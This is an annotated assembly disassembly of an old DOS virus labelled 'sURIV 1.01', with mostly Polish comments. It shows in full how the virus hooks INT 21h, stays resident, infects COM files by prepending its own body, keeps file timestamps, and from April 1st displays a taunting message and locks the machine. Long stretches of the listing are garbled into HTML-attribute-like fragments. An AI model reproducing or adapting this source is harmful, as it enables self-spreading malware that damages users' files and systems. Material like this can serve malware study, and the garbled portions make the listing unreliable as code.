

LF	EQU	0AH
CR	EQU	0DH

S0000	SEGMENT
	ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
	ORG	$+0100H

L0100:	JMP	SHORT	L010F					;0100 EB 0D

	NOP							;0102 90
	DB	'sURIV',0,'1.01'				;0103 73 55 52 49 56 00 31 2E 30 31

L010D	dw	0049h		;wielkosc bloku wirusa (para)	;010D 49 00

L010F:	MOV	L0132,AX					;010F A3 32 01
	MOV	DI,OFFSET L0100			;adres celu	;0112 BF 00 01
	MOV	SI,OFFSET L0481			;oryginalny PGM	;0115 BE 81 04
	MOV	CX,0FF00h			;max dlugosc	;0118 B9 00 FF
	SUB	CX,OFFSET L0481			;minus wirus	;011B 81 E9 81 04
	MOV	AH,0DDH		;do rezydujacego wirusa		;011F B4 DD
	INT	21H		;skopiuj i uruchom		;0121 CD 21
	JMP	SHORT	L0148	;<- powrot="" gdy="" nie="" rezyduje="" ;0123="" eb="" 23="" nop="" ;0125="" 90="" l0126="" dw="" 12e4h="" ;oryginalny="" wektor="" int="" 21h="" ;0126="" e4="" 12="" l0128="" dw="" 0185h="" ;0128="" 85="" 01="" l012a="" dw="" 04c4h="" ;oryginalny="" wektor="" int="" 24h="" ;012a="" c4="" 04="" l012c="" dw="" 0892h="" ;012c="" 92="" 08="" l012e="" dw="" 0100h="" ;dword="" punkt="" startowy="" programu="" ;012e="" 00="" 01="" l0130="" dw="" 0b78h="" ;0130="" 78="" 0b="" l0132="" dw="" 0="" ;schowane="" ax="" ;0132="" 00="" 00="" l0134="" dw="" 0471h="" ;0134="" 71="" 04="" l0136="" dw="" 132ch="" ;0136="" 2c="" 13="" l0138="" dw="" 0bf6bh="" ;0138="" 6b="" bf=""></-><----- parametry="" uruchomienia="" programu="" l013a="" dw="" 0="" ;segment="" env="" ;0140="" 00="" 00="" dw="" 0080h="" ;command="" line="" ;013c="" 80="" 00="" l013e="" dw="" 0b2ah="" ;cs="" ;013e="" 2a="" 0b="" dw="" 005ch="" ;fcb-1="" ;0140="" 5c="" 00="" l0142="" dw="" 0b2ah="" ;cs="" ;0142="" 2a="" 0b="" dw="" 006ch="" ;fcb-2="" ;0144="" 6c="" 00="" l0146="" dw="" 0b2ah="" ;cs="" ;0146="" 2a="" 0b="" l0148:="" mov="" ax,3521h="" ;0148="" b8="" 21="" 35="" int="" 21h="" ;014b="" cd="" 21="" mov="" l0126,bx="" ;oryginalny="" wektor="" int="" 21h="" ;014d="" 89="" 1e="" 26="" 01="" mov="" l0128,es="" ;0151="" 8c="" 06="" 28="" 01="" mov="" ax,2521h="" ;0155="" b8="" 21="" 25="" mov="" dx,offset="" l01bc="" ;nowa="" obsluga="" int="" 21h="" ;0158="" ba="" bc="" 01="" int="" 21h="" ;015b="" cd="" 21="" mov="" ah,4ah="" ;set="" block="" ;015d="" b4="" 4a="" mov="" bx,offset="" l0481="" ;015f="" bb="" 81="" 04="" mov="" sp,offset="" l0481="" ;0162="" bc="" 81="" 04="" push="" ds="" ;0165="" 1e="" pop="" es="" ;segment="" modyf.="" bloku="" ;0166="" 07="" add="" bx,0fh="" ;do="" paragrafu="" ;0167="" 83="" c3="" 0f="" shr="" bx,1="" ;016a="" d1="" eb="" shr="" bx,1="" ;016c="" d1="" eb="" shr="" bx,1="" ;016e="" d1="" eb="" shr="" bx,1="" ;0170="" d1="" eb="" mov="" l010d,bx="" ;wielkosc="" bloku="" ;0172="" 89="" 1e="" 0d="" 01="" int="" 21h="" ;0176="" cd="" 21="" mov="" l013e,cs="" ;0178="" 8c="" 0e="" 3e="" 01="" mov="" l0142,cs="" ;017c="" 8c="" 0e="" 42="" 01="" mov="" l0146,cs="" ;0180="" 8c="" 0e="" 46="" 01="" mov="" es,ds:2ch="" ;seg="" environment="" ;0184="" 8e="" 06="" 2c="" 00="" xor="" di,di="" ;0188="" 33="" ff="" xor="" ax,ax="" ;018a="" 33="" c0="" mov="" cx,0ffffh="" ;018c="" b9="" ff="" ff="" l018f:="" repnz="" scasb="" ;szukanie="" konca="" set'u="" ;018f="" f2="" ae="" cmp="" byte="" ptr="" es:[di],0="" ;0191="" 26="" 80="" 3d="" 00="" jz="" l019a="" ;-=""> koniec		;0195 74 03
	SCASB							;0197 AE
	JNZ	L018F						;0198 75 F5

L019A:	MOV	DX,DI		;<- mamy="" nazwe="" nosiciela="" ;019a="" 8b="" d7="" add="" dx,3="" ;019c="" 83="" c2="" 03="" push="" es="" ;019f="" 06="" pop="" ds="" ;01a0="" 1f="" mov="" ax,4b00h="" ;ponowne="" uruchomienie="" programu="" ;01a1="" b8="" 00="" 4b="" mov="" bx,offset="" l013a="" ;01a4="" bb="" 3a="" 01="" push="" cs="" ;01a7="" 0e="" pop="" es="" ;01a8="" 07="" pushf="" ;01a9="" 9c="" call="" dword="" ptr="" cs:l0126="" ;oryginalny="" wektor="" int="" 21h="" ;01aa="" 2e="" ff="" 1e="" 26="" 01="" mov="" ah,4dh="" ;get="" return="" code="" ;01af="" b4="" 4d="" int="" 21h="" ;01b1="" cd="" 21="" mov="" ah,31h="" ;tsr="" ;01b3="" b4="" 31="" mov="" dx,cs:l010d="" ;wielkosc="" bloku="" wirusa="" (para)="" ;01b5="" 2e="" 8b="" 16="" 0d="" 01="" int="" 21h="" ;01ba="" cd="" 21="" ;="===============================================" ;="" nowa="" obsluga="" int="" 21h="" ;------------------------------------------------="" l01bc:="" pushf="" ;01bc="" 9c="" cmp="" ah,0ddh="" ;czy="" to="" do="" wirusa="" ;01bd="" 80="" fc="" dd="" jz="" l01cd="" ;-=""> tak			;01C0 74 0B
	CMP	AX,4B00h		;czy to uruchomienie ?	;01C2 3D 00 4B
	JZ	L01ED			;-> tak			;01C5 74 26
L01C7:	POPF							;01C7 9D
	JMP	DWORD PTR CS:L0126	;oryginalny wektor int 21h ;01C8 2E FF 2E 26 01

;<---- zlecenie="" do="" wirusa="" l01cd:="" pop="" ax="" ;flagi="" ;01cd="" 58="" pop="" ax="" ;ip="" ;01ce="" 58="" mov="" ax,offset="" l0100="" ;="" ;01cf="" b8="" 00="" 01="" mov="" cs:l012e,ax="" ;01d2="" 2e="" a3="" 2e="" 01="" pop="" ax="" ;cs="" ;01d6="" 58="" mov="" cs:l0130,ax="" ;01d7="" 2e="" a3="" 30="" 01="" repz="" movsb="" ;01db="" f3="" a4="" xor="" ax,ax="" ;inicjacja="" stosu="" ;01dd="" 33="" c0="" push="" ax="" ;01df="" 50="" mov="" ax,cs:l0132="" ;schowane="" ax="" ;01e0="" 2e="" a1="" 32="" 01="" jmp="" dword="" ptr="" cs:l012e="" ;wystartowanie="" nosiciela;01e4="" 2e="" ff="" 2e="" 2e="" 01="" l01e9="" dw="" 0725h="" ;sp="" schowany="" ;01e9="" 25="" 07="" l01eb="" dw="" 0892h="" ;ss="" ;01eb="" 92="" 08=""></----><----- load="" &="" execute="" l01ed:="" mov="" cs:[01e9],sp="" ;01ed="" 2e="" 89="" 26="" e9="" 01="" mov="" cs:[01eb],ss="" ;01f2="" 2e="" 8c="" 16="" eb="" 01="" push="" cs="" ;stack="" init="" ;01f7="" 0e="" pop="" ss="" ;01f8="" 17="" mov="" sp,offset="" l0481="" ;01f9="" bc="" 81="" 04="" push="" ax="" ;01fc="" 50="" push="" bx="" ;01fd="" 53="" push="" cx="" ;01fe="" 51="" push="" dx="" ;01ff="" 52="" push="" si="" ;0200="" 56="" push="" di="" ;0201="" 57="" push="" ds="" ;0202="" 1e="" push="" es="" ;0203="" 06="" mov="" cs:l0134,sp="" ;0204="" 2e="" 89="" 26="" 34="" 01="" mov="" ah,19h="" ;get="" current="" disk="" ;0209="" b4="" 19="" int="" 21h="" ;020b="" cd="" 21="" add="" al,'a'="" ;020d="" 04="" 41="" mov="" cs:l0365,al="" ;020f="" 2e="" a2="" 65="" 03="" mov="" cs:l03b1,al="" ;0213="" 2e="" a2="" b1="" 03="" mov="" di,offset="" l0367="" ;path="" ;0217="" bf="" 67="" 03="" push="" di="" ;021a="" 57="" mov="" si,dx="" ;uruchamiany="" program="" ;021b="" 8b="" f2="" cmp="" byte="" ptr="" [si+1],':'="" ;021d="" 80="" 7c="" 01="" 3a="" jnz="" l0230="" ;-=""> path bez dysku	;0221 75 0D
	MOV	AL,[SI]			;dysk z wywolania	;0223 8A 04
	MOV	CS:L0365,AL					;0225 2E A2 65 03
	MOV	CS:L03B1,AL					;0229 2E A2 B1 03
	ADD	SI,2			;na nazwe		;022D 83 C6 02
L0230:	PUSH	CS						;0230 0E
	POP	ES						;0231 07
	MOV	CX,3FH						;0232 B9 3F 00
L0235:	LODSB				;przepisanie nazwy	;0235 AC
	CMP	AL,'a'						;0236 3C 61
	JB	L0240			;-> duze litery		;0238 72 06
	CMP	AL,'z'						;023A 3C 7A
	JA	L0240			;-> dziwne znaki	;023C 77 02
	ADD	AL,0E0H						;023E 04 E0
L0240:	STOSB							;0240 AA
	LOOP	L0235						;0241 E2 F2
	POP	DI						;0243 5F
	PUSH	CS						;0244 0E
	POP	DS						;0245 1F
	MOV	CX,40H						;0246 B9 40 00
	MOV	AL,'.'						;0249 B0 2E
	REPNZ	SCASB						;024B F2 AE
	MOV	CX,3						;024D B9 03 00
	MOV	SI,OFFSET L03AE		;'COM'			;0250 BE AE 03
	REPZ	CMPSB						;0253 F3 A6
	JZ	L025D			;-> to *.com		;0255 74 06
	JMP	L0404			;-> to *.EXE lub inne	;0257 E9 AA 01

L025A:	JMP	L0355			;<- blad="" dysku,="" koniec="" ;025a="" e9="" f8="" 00="" l025d:="" sub="" di,0bh="" ;czy="" to="" command="" com="" ;025d="" 83="" ef="" 0b="" mov="" cx,7="" ;0260="" b9="" 07="" 00="" mov="" si,offset="" l03a7="" ;command="" ;0263="" be="" a7="" 03="" repz="" cmpsb="" ;0266="" f3="" a6="" jnz="" l026d="" ;-=""> nie, kontynuujemy	;0268 75 03
	JMP	L0404			;-> tak, oszczedzamy	;026A E9 97 01

L026D:	MOV	AX,3524h		;przejecie int 24h	;026D B8 24 35
	INT	21H						;0270 CD 21
	MOV	L012A,BX					;0272 89 1E 2A 01
	MOV	L012C,ES					;0276 8C 06 2C 01
	MOV	AX,2524h					;027A B8 24 25
	MOV	DX,OFFSET L0352		;nowa obsluga		;027D BA 52 03
	INT	21H						;0280 CD 21
	MOV	DX,OFFSET L0365		;nazwa ofiary		;0282 BA 65 03
	MOV	AX,3D00h		;open file (read)	;0285 B8 00 3D
	INT	21H						;0288 CD 21
	MOV	BX,AX			;handle			;028A 8B D8
	MOV	DX,OFFSET L03F9		;bufor			;028C BA F9 03
	MOV	CX,9			;9 bajtow		;028F B9 09 00
	MOV	AH,3FH			;read			;0292 B4 3F
	INT	21H						;0294 CD 21
	JB	L025A			;-> blad		;0296 72 C2
	MOV	AX,5700h		;data zbioru		;0298 B8 00 57
	INT	21H						;029B CD 21
	MOV	L0136,DX					;029D 89 16 36 01
	MOV	L0138,CX					;02A1 89 0E 38 01
	MOV	AH,3EH			;zamkniecie		;02A5 B4 3E
	INT	21H						;02A7 CD 21
	CMP	WORD PTR L03FC,5573h	;'Us'- sygnatura	;02A9 81 3E FC 03 73 55
	JZ	L025A			;-> juz zarazony	;02AF 74 A9
	MOV	DX,OFFSET L03B1		;'TMP$$TMP.COM'		;02B1 BA B1 03
	MOV	AH,3CH			;create handle		;02B4 B4 3C
	XOR	CX,CX						;02B6 33 C9
	INT	21H						;02B8 CD 21
	JB	L025A			;-> blad, koniec	;02BA 72 9E
	MOV	BX,AX			;handle			;02BC 8B D8
	MOV	DX,OFFSET L0100		;poczatek wirusa	;02BE BA 00 01
	MOV	CX,0381h		;dlugosc wirusa		;02C1 B9 81 03
	MOV	AH,40H			;write handle		;02C4 B4 40
	INT	21H						;02C6 CD 21
	CMP	AX,CX			;zapisanych		;02C8 3B C1
	JNZ	L025A			;-> nie wszystkie	;02CA 75 8E
	MOV	L0402,BX		;handle			;02CC 89 1E 02 04
	MOV	DX,OFFSET L0365		;ofiara			;02D0 BA 65 03
	MOV	AX,3D00h		;open handle		;02D3 B8 00 3D
	INT	21H						;02D6 CD 21
	JB	L025A			;-> blad, koniec	;02D8 72 80
	MOV	BX,AX						;02DA 8B D8
	PUSH	BX						;02DC 53
	MOV	BX,0500h		;paragrafy		;02DD BB 00 05
	MOV	AH,48H			;Allocate memory	;02E0 B4 48
	INT	21H						;02E2 CD 21
	POP	BX						;02E4 5B
	XOR	DX,DX						;02E5 33 D2
	MOV	DS,AX			;przydzielony segment	;02E7 8E D8
L02E9:	MOV	CX,5000h		;wielkosc porcji	;02E9 B9 00 50
	MOV	AH,3FH			;read handle		;02EC B4 3F
	INT	21H						;02EE CD 21
	JB	L030D			;-> blad		;02F0 72 1B
	CMP	AX,0						;02F2 3D 00 00
	JZ	L0310			;-> koniec zrodla	;02F5 74 19
	MOV	CX,AX						;02F7 8B C8
	XCHG	BX,CS:L0402		;wymiana handle		;02F9 2E 87 1E 02 04
	MOV	AH,40H			;zapis do zbioru	;02FE B4 40
	INT	21H						;0300 CD 21
	CMP	AX,CX			;czy wszystkie ?	;0302 3B C1
	JNZ	L030D			;-> nie			;0304 75 07
	XCHG	BX,CS:L0402		;wymiana handle		;0306 2E 87 1E 02 04
	JMP	SHORT	L02E9					;030B EB DC

L030D:	JMP	SHORT	L0355		;-> koniec		;030D EB 46

	NOP							;030F 90
L0310:	PUSH	DS			;<- przepisano="" ;0310="" 1e="" pop="" es="" ;0311="" 07="" mov="" ah,49h="" ;free="" allocated="" memory="" ;0312="" b4="" 49="" int="" 21h="" ;0314="" cd="" 21="" push="" cs="" ;0316="" 0e="" push="" cs="" ;0317="" 0e="" pop="" es="" ;0318="" 07="" pop="" ds="" ;0319="" 1f="" mov="" ah,3eh="" ;close="" handle="" ;031a="" b4="" 3e="" int="" 21h="" ;031c="" cd="" 21="" jb="" l030d="" ;-=""> blad = koniec	;031E 72 ED
	MOV	BX,L0402		;handle			;0320 8B 1E 02 04
	MOV	AX,5701h		;set time/date		;0324 B8 01 57
	MOV	DX,L0136		;schowane		;0327 8B 16 36 01
	MOV	CX,L0138					;032B 8B 0E 38 01
	INT	21H						;032F CD 21
	MOV	AH,3EH			;close target handle	;0331 B4 3E
	INT	21H						;0333 CD 21
	JB	L030D			;-> error, end of job	;0335 72 D6
	XOR	CX,CX						;0337 33 C9
	MOV	DX,OFFSET L0365		;path to victim		;0339 BA 65 03
	MOV	AX,4301h		;set file attributes	;033C B8 01 43
	INT	21H						;033F CD 21
	MOV	AH,41H			;delete directory entry	;0341 B4 41
	INT	21H						;0343 CD 21
	MOV	DX,OFFSET L03B1		;temporary file name	;0345 BA B1 03
	MOV	DI,OFFSET L0365		;victim name		;0348 BF 65 03
	MOV	AH,56H			;change directory entry	;034B B4 56
	INT	21H						;034D CD 21
	JMP	SHORT	L0355		;-> ready		;034F EB 04

	NOP							;0351 90

;---------
;	Wlasny int 24h
;--------
L0352:	XOR	AL,AL						;0352 32 C0
	IRET							;0354 CF

;--------
;	End of job
;--------
L0355:	MOV	DX,L012A	;odtworzenie int 24h		;0355 8B 16 2A 01
	MOV	DS,L012C					;0359 8E 1E 2C 01
	MOV	AX,2524h					;035D B8 24 25
	INT	21H						;0360 CD 21
	JMP	L0404		;-> koniec zarazania		;0362 E9 9F 00

L0365	DB	'A:'		;dysk aktualny			;0365 41 3A
L0367	DB	'\1.COM',0,'1.COM',0,0,0,0,0,0,0,0,0,0		;0367 5C 31 2E 43 4F 4D 00 31
	DB	0,0,0,0						;036F 2E 43 4F 4D 00 00 00 00
								;0377 00 00 00 00 00 00 00 00
								;037F 00 00
L0381	DB	0,0,0,0,0,0,0,0,0,0,0,0,0,0			;0381 00 00 00 00 00 00 00 00 00 00 00 00 00 00
	DB	0,0,0,0,0,0,0,0,0,0,0,0,0,0			;038F 00 00 00 00 00 00 00 00 00 00 00 00 00 00
	DB	0,0,0,0,0,0,0,0,0,0				;039D 00 00 00 00 00 00 00 00 00 00
L03A7	DB	'COMMAND'					;03A7 43 4F 4D 4D 41 4E 44
L03AE	DB	'COM'						;03AE 43 4F 4D
L03B1	DB	'A:TMP$$TMP.COM',0				;03B1 41 3A 54 4D 50 24 24 54
								;03B9 4D 50 2E 43 4F 4D 00
L03C0	DB	'APRIL 1ST HA HA HA YOU HAVE A VIRUS$'		;03C0 41 50 52 49 4C 20 31 53
								;03C8 54 20 48 41 20 48 41 20
								;03D0 48 41 20 59 4F 55 20 48
L03E4	DB	'YOU HAVE A VIRUS !!!$'				;03E4 59 4F 55 20 48 41 56 45
								;03EC 20 41 20 56 49 52 55 53

;------ bufor dyskowy
L03F9:	retn							;03F9 C3
	dw	03D9h						;03FA D9 03
L03FC	db	0Ah,0Ah,0Ah,0Dh,09h				;03FC 0A 0A 0A 0D 09
L0401	db	20h						;0401 20

L0402	dw	0005h						;0402 05 00

				;<- koniec="" zarazania="" l0404:="" push="" cs="" ;0404="" 0e="" pop="" ds="" ;0405="" 1f="" mov="" ah,2ah="" ;get="" system="" date="" ;0406="" b4="" 2a="" int="" 21h="" ;0408="" cd="" 21="" cmp="" cx,07c4h="" ;rok="" 1988="" ;040a="" 81="" f9="" c4="" 07="" jb="" l042b="" ;-=""> za wczesny			;040E 72 1B
	CMP	DX,0401h	;miesiac/dzien			;0410 81 FA 01 04
	JZ	L0422		;-> pierwszy kwiecien		;0414 74 0C
	JB	L042B		;-> za wczesny			;0416 72 13
	MOV	DX,OFFSET L03E4	;'YOU HAVE A VIRUS !!!'		;0418 BA E4 03
	MOV	AH,9						;041B B4 09
	INT	21H						;041D CD 21
	JMP	SHORT	L042B					;041F EB 0A

	NOP							;0421 90
L0422:	MOV	DX,OFFSET L03C0	;'APRIL 1ST HA HA...		;0422 BA C0 03
	MOV	AH,9						;0425 B4 09
	INT	21H						;0427 CD 21
L0429:	JMP	SHORT	L0429	;blokada			;0429 EB FE

				;uruchomienie zarazonego programu
L042B:	MOV	SP,CS:L0134	;SP po zlozeniu rejestrow	;042B 2E 8B 26 34 01
	POP	ES						;0430 07
	POP	DS						;0431 1F
	POP	DI						;0432 5F
	POP	SI						;0433 5E
	POP	DX						;0434 5A
	POP	CX						;0435 59
	POP	BX						;0436 5B
	POP	AX						;0437 58
	MOV	SS,CS:L01EB	;oryginalny stos		;0438 2E 8E 16 EB 01
	MOV	SP,CS:L01E9					;043D 2E 8B 26 E9 01
	JMP	L01C7		;wskok w oryginalne int 21h	;0442 E9 82 FD

;-----------------------------------------------
;	Stos
;-----------------------------------------------
	db	000h,000h,000h,000h,000h,000h,000h,000h	;0445 00 00 00 00 00 00 00 00
	db	000h,000h,000h,000h,000h,000h,055h,031h	;044D 00 00 00 00 00 00 55 31
	db	0F3h,00Bh,0EBh,013h,005h,040h,005h,000h	;0455 F3 0B EB 13 05 40 05 00
	db	081h,003h,000h,001h,0A8h,003h,063h,003h	;045D 81 03 00 01 A8 03 63 03
	db	081h,000h,02Ah,00Bh,092h,008h,0C8h,002h	;0465 81 00 2A 0B 92 08 C8 02
	db	02Ah,00Bh,046h,0F0h,092h,008h,079h,09Bh	;046D 2A 0B 46 F0 92 08 79 9B
	db	000h,001h,000h,001h,0CBh,03Ch,092h,008h	;0475 00 01 00 01 CB 3C 92 08
	db	0D3h,00Bh,000h,04Bh			;047D D3 0B 00 4B
L0481	label	word		;<- stack="" top="" ;="===============================" retn=""></-><- oryginalny="" program="" ;0481="" c3="" s0000="" ends="" end="" l0100="" =""></-></-></-></-></-----></-></----->